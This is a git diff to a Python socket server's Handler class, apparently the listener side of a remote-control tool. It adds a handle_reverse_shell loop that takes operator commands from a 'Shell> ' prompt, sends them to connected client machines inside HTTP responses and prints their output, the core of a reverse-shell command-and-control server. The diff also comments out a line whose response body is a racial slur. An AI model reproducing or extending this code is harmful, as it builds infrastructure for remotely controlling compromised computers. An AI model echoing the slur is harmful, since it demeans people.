@@ -1,6 +1,8 @@
 import socket
 from Database import Database
 from HttpResponse import HttpResponse
+from HttpRequest import HttpRequest
+import time
 
 
 class Handler:
@@ -26,14 +28,27 @@ class Handler:
         :type addr: tuple
         :return: None
         """
-        response = HttpResponse.generate_response(200, "I LIKE NIGGERS!")
-        client_sock.send(response.encode())
+        # response = HttpResponse.generate_response(200, "I LIKE NIGGERS!")
+        # client_sock.send(response.encode())
         if Database.computer_exist(addr[0]):
-            pass
             Database.client_lock.acquire()
             Database.connected_clients.append(tuple((addr, client_sock)))
             Database.client_lock.release()
         else:
             # TODO: Not existing computer in database
             pass
+        Handler.handle_reverse_shell(client_sock)
 
+    @staticmethod
+    def handle_reverse_shell(client_sock):
+        while True:
+
+            command = input("Shell> ")
+            response = HttpResponse.generate_response(200, command)
+            client_sock.send(response.encode())
+            data = client_sock.recv(4098).decode()
+            print(data)
+            data = client_sock.recv(4098).decode()
+            print(data)
+            data = client_sock.recv(4098).decode()
+            print(data)
